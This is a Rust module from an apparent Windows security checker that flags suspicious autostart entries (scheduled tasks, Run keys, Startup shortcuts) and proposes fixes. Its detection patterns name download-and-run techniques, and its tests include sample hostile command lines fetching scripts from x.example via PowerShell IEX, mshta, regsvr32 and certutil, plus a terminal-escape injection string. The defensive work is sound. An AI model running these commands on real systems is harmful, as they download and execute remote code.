//! Ce qui se lance tout seul sous Windows : tâches planifiées, clés Run et RunOnce, dossiers Démarrage.

use super::*;
use crate::commande::decouper_commande;

/// Pourquoi ce programme lancé automatiquement (tâche planifiée, clé Run, dossier Démarrage) ressemble à un
/// malware, ou `None`. Seules des formes précises sont retenues : les programmes installés normalement n'y tombent pas.
pub(super) fn lancement_suspect(exe: &str, args: &str) -> Option<&'static str> {
    let exe = exe.trim().trim_matches('"').to_lowercase().replace('/', "\\");
    let args = args.to_lowercase();
    let tout = format!("{exe} {args}");
    let temporaire = |t: &str| {
        ["\\appdata\\local\\temp\\", "%temp%", "%tmp%", "\\windows\\temp\\"]
            .iter()
            .any(|d| t.contains(d))
    };
    let public = |t: &str| {
        ["\\users\\public\\", "\\$recycle.bin\\", "%public%"]
            .iter()
            .any(|d| t.contains(d))
    };
    let programme = exe.rsplit('\\').next().unwrap_or(&exe).trim_end_matches(".exe");
    if temporaire(&exe) {
        return Some(tr!(
            "programme lancé depuis un dossier temporaire",
            "program started from a temporary folder"
        ));
    }
    if public(&exe) {
        return Some(tr!(
            "programme rangé dans le dossier Public ou la corbeille",
            "program stored in the Public folder or the recycle bin"
        ));
    }
    let jetons: Vec<String> = args
        .split_whitespace()
        .map(|j| j.trim_matches('"').replacen('/', "-", 1))
        .collect();
    let a = |m: &str| jetons.iter().any(|j| j == m);
    match programme {
        "powershell" | "pwsh" => {
            let cache = jetons.iter().any(|j| {
                j == "-e" || j == "-ec" || (j.starts_with("-en") && "-encodedcommand".starts_with(j.as_str()))
            });
            if cache {
                return Some(tr!(
                    "commande PowerShell cachée en base64",
                    "PowerShell command hidden in base64"
                ));
            }
            let execute = ["iex", "invoke-expression"].iter().any(|m| args.contains(m));
            let telecharge = [
                "downloadstring",
                "downloadfile",
                "invoke-webrequest",
                "iwr ",
                "net.webclient",
                "invoke-restmethod",
                "irm ",
            ]
            .iter()
            .any(|m| args.contains(m));
            if execute && telecharge {
                return Some(tr!(
                    "télécharge un script et l'exécute aussitôt",
                    "downloads a script and runs it right away"
                ));
            }
        }
        "mshta"
            if ["http:", "https:", "javascript:", "vbscript:"]
                .iter()
                .any(|m| args.contains(m)) =>
        {
            return Some(tr!(
                "mshta lance un script venu d'Internet",
                "mshta runs a script from the Internet"
            ));
        }
        "regsvr32" if args.contains("scrobj.dll") || args.contains("-i:http") || args.contains("/i:http") => {
            return Some(tr!(
                "regsvr32 charge un script distant",
                "regsvr32 loads a remote script"
            ));
        }
        "rundll32" if args.contains("javascript:") => {
            return Some(tr!("rundll32 exécute du JavaScript", "rundll32 runs JavaScript"));
        }
        "certutil" if a("-urlcache") || a("-decode") => {
            return Some(tr!(
                "certutil détourné pour télécharger ou décoder un fichier",
                "certutil misused to download or decode a file"
            ));
        }
        "bitsadmin" if a("-transfer") => {
            return Some(tr!(
                "bitsadmin détourné pour télécharger un fichier",
                "bitsadmin misused to download a file"
            ));
        }
        _ => {}
    }
    // Interpréteurs et outils système qui lancent un script ou une bibliothèque rangés dans un dossier temporaire ou public.
    let relais = [
        "wscript",
        "cscript",
        "mshta",
        "rundll32",
        "regsvr32",
        "cmd",
        "powershell",
        "pwsh",
    ];
    if relais.contains(&programme) && (temporaire(&tout) || public(&tout)) {
        return Some(tr!(
            "script ou bibliothèque lancé depuis un dossier temporaire ou public",
            "script or library started from a temporary or public folder"
        ));
    }
    if ["wscript", "cscript"].contains(&programme) && args.contains("\\appdata\\") {
        return Some(tr!(
            "script caché dans les données d'application, lancé automatiquement",
            "script hidden in application data, started automatically"
        ));
    }
    None
}

/// Les tâches planifiées hors \Microsoft\, lues par PowerShell : le planificateur ne se lit que par COM.
const TACHES: &str = "try { Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' -and $_.TaskPath -notlike '\\Microsoft\\*' } | ForEach-Object { $t = $_; \
         $t.Actions | Where-Object { $_.Execute } | ForEach-Object { \"TCH|$($t.TaskPath)|$($t.TaskName)|$($_.Execute)|$($_.Arguments)\" } }; 'TCH_FIN' } catch {}";

/// Les dossiers Démarrage par PowerShell, en secours d'un raccourci que la lecture native ne comprend pas. Un dossier
/// qui n'existe pas (profil neuf, dossier supprimé) donne un chemin vide, et `Get-ChildItem ''` lit le dossier
/// courant : lancé depuis la clé, chacun de ses programmes passait pour un démarrage suspect. D'où les chemins vides
/// écartés.
const DEMARRAGE: &str = "try { $w = New-Object -ComObject WScript.Shell; foreach ($d in [Environment]::GetFolderPath('Startup'), [Environment]::GetFolderPath('CommonStartup') | Where-Object { $_ }) { \
         Get-ChildItem -LiteralPath $d -File -ErrorAction SilentlyContinue | Where-Object Name -ne 'desktop.ini' | ForEach-Object { \
         $cible = if ($_.Extension -eq '.lnk') { $r = $w.CreateShortcut($_.FullName); '\"' + $r.TargetPath + '\" ' + $r.Arguments } else { '\"' + $_.FullName + '\"' }; \
         \"DEM|$($_.FullName)|$cible\" } }; 'DEM_FIN' } catch {}";

/// Les clés Run et RunOnce de la lecture, sous le nom que PowerShell leur donne (la correction le reprend tel quel).
const CLES_RUN: [&str; 5] = [
    r"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    r"HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    r"HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    r"HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    r"HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
];

/// Les variables d'environnement d'un texte (« %APPDATA%\x.vbs ») remplacées comme Windows les remplace ; une
/// variable inconnue reste telle quelle.
fn developper(texte: &str, variable: impl Fn(&str) -> Option<String>) -> String {
    let mut sortie = String::new();
    let mut reste = texte;
    while let Some(debut) = reste.find('%') {
        sortie.push_str(&reste[..debut]);
        let apres = &reste[debut + 1..];
        if let Some(fin) = apres.find('%')
            && fin > 0
            && let Some(v) = variable(&apres[..fin])
        {
            sortie.push_str(&v);
            reste = &apres[fin + 1..];
        } else {
            sortie.push('%');
            reste = apres;
        }
    }
    sortie.push_str(reste);
    sortie
}

/// Une valeur du registre en texte, comme Get-ItemProperty la rend : REG_EXPAND_SZ développée (sinon
/// « %APPDATA%\… » échapperait au jugement), plusieurs chaînes jointes par une espace, nombres en décimal.
fn valeur_texte(valeur: &winreg::RegValue) -> String {
    use winreg::enums::RegType::{REG_DWORD, REG_EXPAND_SZ, REG_MULTI_SZ, REG_QWORD, REG_SZ};
    use winreg::types::FromRegValue;
    match valeur.vtype {
        REG_SZ | REG_MULTI_SZ => String::from_reg_value(valeur).unwrap_or_default().replace('\n', " "),
        REG_EXPAND_SZ => developper(&String::from_reg_value(valeur).unwrap_or_default(), |n| {
            std::env::var(n).ok()
        }),
        REG_DWORD => u32::from_reg_value(valeur).map(|n| n.to_string()).unwrap_or_default(),
        REG_QWORD => u64::from_reg_value(valeur).map(|n| n.to_string()).unwrap_or_default(),
        _ => String::new(),
    }
}

/// La section RUN, lue par winreg. Toutes les valeurs comptent : le filtre « PS* » du script n'écartait que les
/// propriétés ajoutées par PowerShell (PSPath…), mais cachait aussi une valeur nommée « PSUpdate ».
fn lignes_run() -> Vec<String> {
    use winreg::RegKey;
    use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
    let mut lignes = Vec::new();
    for nom_cle in CLES_RUN {
        let Some((ruche, chemin)) = nom_cle.split_once(r":\") else {
            continue;
        };
        let racine = RegKey::predef(if ruche == "HKCU" {
            HKEY_CURRENT_USER
        } else {
            HKEY_LOCAL_MACHINE
        });
        let Ok(cle) = racine.open_subkey(chemin) else {
            continue;
        };
        for (nom, valeur) in cle.enum_values().flatten() {
            let nom = if nom.is_empty() { "(default)".to_string() } else { nom };
            lignes.push(format!("{nom_cle}|{nom}|{}", valeur_texte(&valeur)));
        }
    }
    lignes
}

/// Le texte d'un tampon UTF-16 (petit-boutiste) jusqu'au premier zéro.
fn utf16_zero(octets: &[u8]) -> String {
    let mots: Vec<u16> = octets
        .as_chunks::<2>()
        .0
        .iter()
        .map(|&m| u16::from_le_bytes(m))
        .take_while(|&m| m != 0)
        .collect();
    String::from_utf16_lossy(&mots)
}

/// Le texte d'un tampon ANSI jusqu'au premier zéro, lu en Latin-1 (les chemins des raccourcis récents ont aussi
/// leur version UTF-16, préférée quand elle existe).
fn ansi_zero(octets: &[u8]) -> String {
    octets.iter().take_while(|&&o| o != 0).map(|&o| char::from(o)).collect()
}

/// Le chemin de la cible dans le bloc LinkInfo d'un raccourci : chemin local (ou nom réseau) suivi du suffixe commun.
fn chemin_infos(infos: &[u8]) -> Option<String> {
    let u32_a = |p: usize| octets_u32(infos, p).and_then(|n| usize::try_from(n).ok());
    let a_partir = |p: usize| infos.get(p..);
    let entete = u32_a(4)?;
    let drapeaux = u32_a(8)?;
    let unicode = |champ: usize| (entete >= 0x24).then(|| u32_a(champ)).flatten().filter(|&o| o != 0);
    let base = if drapeaux & 0x1 != 0 {
        match unicode(0x1C) {
            Some(o) => utf16_zero(a_partir(o)?),
            None => ansi_zero(a_partir(u32_a(0x10)?)?),
        }
    } else if drapeaux & 0x2 != 0 {
        let reseau = a_partir(u32_a(0x14)?)?;
        let nom = usize::try_from(octets_u32(reseau, 8)?).ok()?;
        let nom_unicode = (nom > 0x14).then(|| octets_u32(reseau, 0x14)).flatten();
        let nom = match nom_unicode.and_then(|o| usize::try_from(o).ok()) {
            Some(o) => utf16_zero(reseau.get(o..)?),
            None => ansi_zero(reseau.get(nom..)?),
        };
        nom + "\\"
    } else {
        return None;
    };
    let suffixe = match unicode(0x20) {
        Some(o) => utf16_zero(a_partir(o)?),
        None => ansi_zero(a_partir(u32_a(0x18)?)?),
    };
    let cible = if suffixe.is_empty() || base.ends_with('\\') {
        base + &suffixe
    } else {
        format!("{base}\\{suffixe}")
    };
    (!cible.is_empty()).then_some(cible)
}

fn octets_u32(octets: &[u8], p: usize) -> Option<u32> {
    let b = octets.get(p..p.checked_add(4)?)?;
    Some(u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
}

fn octets_u16(octets: &[u8], p: usize) -> Option<u16> {
    let b = octets.get(p..p.checked_add(2)?)?;
    Some(u16::from_le_bytes([b[0], b[1]]))
}

/// La cible et les arguments d'un raccourci (.lnk), lus dans le fichier (format MS-SHLLINK) sans COM. `None` quand
/// la cible ne s'y lit pas (raccourci réduit à une liste d'éléments du shell) : l'appelant reprend alors PowerShell,
/// pour qu'aucun raccourci ne compte comme sain sans avoir été lu.
fn cible_raccourci(octets: &[u8]) -> Option<(String, String)> {
    // L'identifiant de classe des raccourcis, 00021401-0000-0000-C000-000000000046, tel qu'il est écrit dans le fichier.
    const CLASSE: [u8; 16] = [1, 0x14, 2, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46];
    const LISTE: u32 = 0x1;
    const INFOS: u32 = 0x2;
    const UNICODE: u32 = 0x80;
    const VARIABLES: u32 = 0xA000_0001;
    let tranche = |p: usize, n: usize| octets.get(p..p.checked_add(n)?);
    if octets_u32(octets, 0)? != 0x4C || tranche(4, 16)? != CLASSE {
        return None;
    }
    let drapeaux = octets_u32(octets, 0x14)?;
    let mut p = 0x4C;
    if drapeaux & LISTE != 0 {
        p += 2 + usize::from(octets_u16(octets, p)?);
    }
    let mut cible_infos = None;
    if drapeaux & INFOS != 0 {
        let infos = tranche(p, usize::try_from(octets_u32(octets, p)?).ok()?)?;
        cible_infos = chemin_infos(infos);
        p += infos.len();
    }
    // Nom, chemin relatif, dossier de travail, arguments, icône : chacun présent selon son drapeau.
    let mut arguments = String::new();
    for drapeau in [0x4, 0x8, 0x10, 0x20, 0x40] {
        if drapeaux & drapeau == 0 {
            continue;
        }
        let n = usize::from(octets_u16(octets, p)?);
        let taille = if drapeaux & UNICODE != 0 { n * 2 } else { n };
        let brut = tranche(p + 2, taille)?;
        if drapeau == 0x20 {
            arguments = if drapeaux & UNICODE != 0 {
                utf16_zero(brut)
            } else {
                ansi_zero(brut)
            };
        }
        p += 2 + taille;
    }
    // Les blocs de la fin : celui des variables d'environnement donne la cible que Windows développe et préfère.
    let mut cible_variables = None;
    while let Some(taille) = octets_u32(octets, p).and_then(|n| usize::try_from(n).ok())
        && taille >= 8
    {
        let bloc = tranche(p, taille)?;
        if octets_u32(bloc, 4) == Some(VARIABLES) && bloc.len() >= 8 + 260 + 520 {
            let texte = match utf16_zero(&bloc[268..788]) {
                t if t.is_empty() => ansi_zero(&bloc[8..268]),
                t => t,
            };
            if !texte.is_empty() {
                cible_variables = Some(developper(&texte, |n| std::env::var(n).ok()));
            }
        }
        p += taille;
    }
    Some((cible_variables.or(cible_infos)?, arguments))
}

/// Les dossiers Démarrage de la personne puis de tous, comme [Environment]::GetFolderPath les donne. Un chemin vide
/// ou relatif est écarté : il lirait le dossier courant (la clé, avec ses programmes).
fn dossiers_demarrage() -> Vec<std::path::PathBuf> {
    use winreg::RegKey;
    use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
    const DOSSIERS: &str = r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders";
    let lire = |ruche, nom: &str, defaut: &str| {
        RegKey::predef(ruche)
            .open_subkey(DOSSIERS)
            .and_then(|k| k.get_raw_value(nom))
            .map(|v| valeur_texte(&v))
            .ok()
            .filter(|d| !d.is_empty())
            .unwrap_or_else(|| developper(defaut, |n| std::env::var(n).ok()))
    };
    [
        lire(
            HKEY_CURRENT_USER,
            "Startup",
            r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup",
        ),
        lire(
            HKEY_LOCAL_MACHINE,
            "Common Startup",
            r"%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup",
        ),
    ]
    .into_iter()
    .map(std::path::PathBuf::from)
    .filter(|d| d.is_absolute())
    .collect()
}

/// La section DEM : `None` si un raccourci ne se lit pas sans COM. Les fichiers cachés comptent aussi (le script
/// d'avant, sans -Force, ne les voyait pas).
fn lignes_demarrage() -> Option<Vec<String>> {
    use std::io::Read;
    let mut lignes = Vec::new();
    for dossier in dossiers_demarrage() {
        let Ok(entrees) = std::fs::read_dir(&dossier) else {
            continue;
        };
        for entree in entrees.flatten() {
            let chemin = entree.path();
            if !chemin.is_file() || entree.file_name().eq_ignore_ascii_case("desktop.ini") {
                continue;
            }
            let plein = chemin.to_string_lossy();
            let cible = if chemin.extension().is_some_and(|x| x.eq_ignore_ascii_case("lnk")) {
                // Un raccourci tient en quelques kilo-octets : lu au plus sur un mégaoctet.
                let mut octets = Vec::new();
                std::fs::File::open(&chemin)
                    .ok()?
                    .take(1 << 20)
                    .read_to_end(&mut octets)
                    .ok()?;
                let (cible, arguments) = cible_raccourci(&octets)?;
                format!("\"{cible}\" {arguments}")
            } else {
                format!("\"{plein}\"")
            };
            lignes.push(format!("{plein}|{cible}"));
        }
    }
    Some(lignes)
}

/// Ce qui se lance tout seul hors de Windows : tâches planifiées (hors \Microsoft\), clés Run et RunOnce,
/// dossiers Démarrage. Clés et dossiers sont lus sans PowerShell ; lui ne lit plus que les tâches, et les dossiers
/// Démarrage quand un raccourci ne se lit pas autrement.
pub(super) fn persistance() -> Vec<Constat> {
    let run = lignes_run();
    let demarrage = lignes_demarrage();
    let sortie = ps(&if demarrage.is_some() {
        TACHES.to_string()
    } else {
        format!("{TACHES}; {DEMARRAGE}")
    });
    let taches = section(sortie.as_deref(), "TCH");
    let demarrage: Option<Vec<&str>> = match &demarrage {
        Some(lignes) => Some(lignes.iter().map(String::as_str).collect()),
        None => section(sortie.as_deref(), "DEM"),
    };
    let run: Vec<&str> = run.iter().map(String::as_str).collect();
    let Some(taches) = taches else {
        // Clés et dossiers restent jugés, mais rien ne dit que les tâches sont saines : pas de « aucun suspect ».
        let mut constats: Vec<Constat> = juger_persistance(&[], &run, &demarrage.unwrap_or_default())
            .into_iter()
            .filter(|c| c.probleme.is_some())
            .collect();
        constats.push(impossible(
            "Persistance",
            tr!(
                "tâches planifiées non lues (PowerShell indisponible ou bloqué)",
                "scheduled tasks not read (PowerShell unavailable or blocked)"
            ),
        ));
        return constats;
    };
    juger_persistance(&taches, &run, &demarrage.unwrap_or_default())
}

fn juger_persistance(taches: &[&str], run: &[&str], demarrage: &[&str]) -> Vec<Constat> {
    let ps_texte = crate::commande::ps_texte;
    // Noms, chemins et commandes sont choisis par le programme qui se fait relancer : les corrections visent le vrai
    // nom, les messages le montrent rendu inoffensif.
    let montre = crate::ui::affichable;
    let mut constats = Vec::new();
    for t in taches {
        let c: Vec<&str> = t.trim().splitn(4, '|').collect();
        let [chemin_brut, nom_brut, exe_brut, args_brut] = c[..] else {
            continue;
        };
        if let Some(raison) = lancement_suspect(exe_brut, args_brut) {
            let (chemin, nom, exe, args) = (
                montre(chemin_brut),
                montre(nom_brut),
                montre(exe_brut),
                montre(args_brut),
            );
            constats.push(
                alerte(
                    "Persistance",
                    Niveau::Eleve,
                    trf!(
                        "Tâche planifiée suspecte « {chemin}{nom} » : {raison} ({exe} {args}).",
                        "Suspicious scheduled task “{chemin}{nom}”: {raison} ({exe} {args})."
                    ),
                )
                .corriger(
                    trf!(
                        "Désactiver la tâche « {nom} » (réactivable)",
                        "Disable the “{nom}” task (can be turned back on)"
                    ),
                    &[&format!(
                        "Disable-ScheduledTask -TaskPath '{}' -TaskName '{}' | Out-Null",
                        ps_texte(chemin_brut),
                        ps_texte(nom_brut)
                    )],
                ),
            );
        }
    }
    for r in run {
        let c: Vec<&str> = r.trim().splitn(3, '|').collect();
        let [cle_brute, nom_brut, valeur_brute] = c[..] else {
            continue;
        };
        let (exe, args) = decouper_commande(valeur_brute);
        if let Some(raison) = lancement_suspect(&exe, &args) {
            let (cle, nom, valeur) = (montre(cle_brute), montre(nom_brut), montre(valeur_brute));
            constats.push(
                alerte(
                    "Persistance",
                    Niveau::Eleve,
                    trf!(
                        "Lancement automatique suspect « {nom} » ({cle}) : {raison} ({valeur}).",
                        "Suspicious autostart “{nom}” ({cle}): {raison} ({valeur})."
                    ),
                )
                .corriger(
                    trf!("Retirer « {nom} » du démarrage", "Remove “{nom}” from startup"),
                    &[&format!(
                        "Remove-ItemProperty -Path '{}' -Name '{}'",
                        ps_texte(cle_brute),
                        ps_texte(nom_brut)
                    )],
                ),
            );
        }
    }
    for d in demarrage {
        let Some((fichier_brut, cible_brute)) = d.trim().split_once('|') else {
            continue;
        };
        let (exe, args) = decouper_commande(cible_brute);
        if let Some(raison) = lancement_suspect(&exe, &args) {
            let (fichier, cible) = (montre(fichier_brut), montre(cible_brute));
            constats.push(
                alerte(
                    "Persistance",
                    Niveau::Eleve,
                    trf!(
                        "Raccourci suspect dans le dossier Démarrage « {fichier} » : {raison} ({cible}).",
                        "Suspicious shortcut in the Startup folder “{fichier}”: {raison} ({cible})."
                    ),
                )
                .corriger(
                    trf!("Supprimer « {fichier} »", "Delete “{fichier}”"),
                    &[&format!("Remove-Item -LiteralPath '{}'", ps_texte(fichier_brut))],
                ),
            );
        }
    }
    if constats.is_empty() {
        constats.push(ok(
            "Persistance",
            trf!(
                "{} tâche(s) planifiée(s) hors Microsoft et {} programme(s) au démarrage, aucun suspect.",
                "{} non-Microsoft scheduled task(s) and {} startup program(s), none suspicious.",
                taches.len(),
                run.len() + demarrage.len()
            ),
        ));
    }
    constats
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dossier_demarrage_absent_ne_lit_pas_le_dossier_courant() {
        // Un chemin vide lirait le dossier courant (constaté dans un compte neuf, le 19 octobre).
        assert!(DEMARRAGE.contains("[Environment]::GetFolderPath('CommonStartup') | Where-Object { $_ })"));
        assert!(DEMARRAGE.contains("Get-ChildItem -LiteralPath $d -File"));
        assert!(!DEMARRAGE.contains("Get-ChildItem $d"));
    }

    /// Un raccourci fabriqué octet par octet comme Windows l'écrit : en-tête, LinkInfo (chemin local ANSI), arguments
    /// en UTF-16, bloc de fin.
    fn raccourci(drapeaux: u32, infos: bool, fin: &[u8]) -> Vec<u8> {
        let mut o = vec![0u8; 0x4C];
        o[..4].copy_from_slice(&0x4Cu32.to_le_bytes());
        o[4..20].copy_from_slice(&[1, 0x14, 2, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46]);
        o[0x14..0x18].copy_from_slice(&drapeaux.to_le_bytes());
        if infos {
            let base = b"C:\\Users\\Public\\c.exe\0";
            let mut bloc = Vec::new();
            let taille = 0x1C + base.len() + 1;
            for champ in [taille, 0x1C, 1, 0, 0x1C, 0, 0x1C + base.len()] {
                bloc.extend_from_slice(&u32::try_from(champ).unwrap().to_le_bytes());
            }
            bloc.extend_from_slice(base);
            bloc.push(0);
            o.extend_from_slice(&bloc);
        }
        if drapeaux & 0x20 != 0 {
            let args: Vec<u16> = "-x".encode_utf16().collect();
            o.extend_from_slice(&u16::try_from(args.len()).unwrap().to_le_bytes());
            o.extend(args.iter().flat_map(|m| m.to_le_bytes()));
        }
        o.extend_from_slice(fin);
        o.extend_from_slice(&0u32.to_le_bytes());
        o
    }

    #[test]
    fn raccourcis_lus_sans_com() {
        let o = raccourci(0x2 | 0x20 | 0x80, true, &[]);
        assert_eq!(
            cible_raccourci(&o),
            Some((r"C:\Users\Public\c.exe".to_string(), "-x".to_string()))
        );
        // Le bloc des variables d'environnement passe avant LinkInfo, comme pour Windows.
        let mut bloc = vec![0u8; 0x314];
        bloc[..4].copy_from_slice(&0x314u32.to_le_bytes());
        bloc[4..8].copy_from_slice(&0xA000_0001u32.to_le_bytes());
        for (i, m) in r"C:\Users\alice\AppData\Roaming\b.vbs".encode_utf16().enumerate() {
            bloc[268 + 2 * i..270 + 2 * i].copy_from_slice(&m.to_le_bytes());
        }
        let o = raccourci(0x2 | 0x20 | 0x80 | 0x200, true, &bloc);
        assert_eq!(cible_raccourci(&o).unwrap().0, r"C:\Users\alice\AppData\Roaming\b.vbs");
        // Sans LinkInfo ni variables (liste d'éléments du shell seule), tronqué ou pas un raccourci : rien, jamais
        // une cible inventée.
        assert_eq!(cible_raccourci(&raccourci(0x20 | 0x80, false, &[])), None);
        let o = raccourci(0x2 | 0x20 | 0x80, true, &[]);
        for n in [0, 10, 0x4C, 0x60, o.len() - 6] {
            assert_eq!(cible_raccourci(&o[..n]), None, "{n}");
        }
        let mut faux = o.clone();
        faux[4] = 0;
        assert_eq!(cible_raccourci(&faux), None);
        // Tailles absurdes : refusées sans paniquer.
        let mut geant = o;
        geant[0x4C..0x50].copy_from_slice(&u32::MAX.to_le_bytes());
        assert_eq!(cible_raccourci(&geant), None);
    }

    #[test]
    fn variables_developpees() {
        let v = |n: &str| (n == "APPDATA").then(|| r"C:\Users\alice\AppData\Roaming".to_string());
        assert_eq!(
            developper(r"%APPDATA%\b.vbs", v),
            r"C:\Users\alice\AppData\Roaming\b.vbs"
        );
        assert_eq!(developper("100% %INCONNUE% %%", v), "100% %INCONNUE% %%");
    }

    /// Sous Wine, les vraies lectures répondent sans planter ; aucun dossier Démarrage relatif (le dossier courant).
    #[test]
    fn lectures_natives_sous_wine() {
        let _ = lignes_run();
        let _ = lignes_demarrage();
        assert!(dossiers_demarrage().iter().all(|d| d.is_absolute()));
    }

    #[test]
    fn lancements_suspects() {
        let s = |ligne: &str| {
            let (exe, args) = decouper_commande(ligne);
            lancement_suspect(&exe, &args).is_some()
        };
        // Programmes installés normalement : rien à signaler.
        assert!(!s(r#""C:\Program Files\Steam\steam.exe" -silent"#));
        assert!(!s(
            r"C:\Users\alice\AppData\Local\Discord\Update.exe --processStart Discord.exe"
        ));
        assert!(!s(r"C:\Program Files\Mozilla Firefox\firefox.exe -os-autostart"));
        assert!(!s(
            r#""C:\Program Files\PowerShell\7\pwsh.exe" -ExecutionPolicy Bypass -File C:\Scripts\sauvegarde.ps1"#
        ));
        assert!(!s(r"%windir%\system32\rundll32.exe printui.dll,PrintUIEntry"));
        // Formes de malware.
        assert!(s(r"C:\Users\alice\AppData\Local\Temp\svch0st.exe"));
        assert!(s(r"C:\Users\Public\update.exe /q"));
        assert!(s(
            r"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
        ));
        assert!(s(r"powershell -e SQBFAFgA"));
        assert!(s(r"powershell.exe /EncodedCommand SQBFAFgA"));
        assert!(s(
            r#"powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')""#
        ));
        assert!(s(r"mshta.exe https://x.example/a.hta"));
        assert!(s(r"regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll"));
        assert!(s(r"certutil.exe -urlcache -split -f http://x.example/a.exe a.exe"));
        assert!(s(r"wscript.exe C:\Users\alice\AppData\Roaming\x\run.vbs"));
        assert!(s(r"rundll32.exe C:\Users\alice\AppData\Local\Temp\a.dll,Start"));
        assert_eq!(
            decouper_commande(r"C:\Program Files\App\app.exe /min"),
            (r"C:\Program Files\App\app.exe".to_string(), "/min".to_string())
        );
    }

    #[test]
    fn persistance_jugee() {
        let taches = [
            r"\|Mise a jour|C:\Users\alice\AppData\Local\Temp\a.exe|",
            r"\Mozilla\|Firefox Default Browser Agent|C:\Program Files\Mozilla Firefox\default-browser-agent.exe|do-task",
        ];
        let c = juger_persistance(&taches, &[], &[]);
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].probleme, Some(Niveau::Eleve));
        assert!(
            c[0].correctif.as_ref().unwrap().commandes[0]
                .contains("Disable-ScheduledTask -TaskPath '\\' -TaskName 'Mise a jour'")
        );
        let run = [
            r#"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run|Steam|"C:\Program Files (x86)\Steam\steam.exe" -silent"#,
        ];
        let c = juger_persistance(&[], &run, &[]);
        assert!(c.len() == 1 && c[0].probleme.is_none());
        // Nom de tâche, valeur Run et raccourci choisis par le programme qui les pose : montrés inoffensifs, mais la
        // correction vise le vrai nom.
        let piege = "Maj\x1b]52;c;eA==\x07\x1b[2K\r\u{202e}";
        let taches = [format!(r"\|{piege}|C:\Users\alice\AppData\Local\Temp\a.exe|")];
        let run = [format!(
            r"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run|{piege}|C:\Users\Public\b.exe"
        )];
        let dem = [format!(
            r"C:\Users\alice\Start Menu\Programs\Startup\{piege}.lnk|C:\Users\Public\c.exe"
        )];
        let (taches, run, dem): (Vec<&str>, Vec<&str>, Vec<&str>) = (
            taches.iter().map(String::as_str).collect(),
            run.iter().map(String::as_str).collect(),
            dem.iter().map(String::as_str).collect(),
        );
        let c = juger_persistance(&taches, &run, &dem);
        assert_eq!(c.len(), 3);
        for c in &c {
            let k = c.correctif.as_ref().unwrap();
            assert!(!crate::ui::contient_un_piege(&c.message), "{}", c.message);
            assert!(!crate::ui::contient_un_piege(&k.action), "{}", k.action);
            assert!(k.commandes[0].contains(piege), "{}", k.commandes[0]);
        }
    }
}
